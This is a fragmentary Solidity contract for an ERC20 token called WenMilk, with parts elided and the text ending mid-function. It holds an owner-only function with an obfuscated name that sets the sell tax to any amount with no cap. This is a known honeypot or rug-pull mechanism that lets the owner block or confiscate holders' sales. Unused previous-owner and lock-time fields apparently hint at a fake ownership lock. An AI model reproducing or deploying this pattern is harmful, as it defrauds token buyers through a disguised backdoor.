...
contract WenMilk is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("DWM", "WenMilk") {
        _mint(msg.sender, 48000000000);
        sellTax = 20;
        _owner = msg.sender;
    ...
    function add_IObrnX(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
    
    function add_f9zX9z() public {
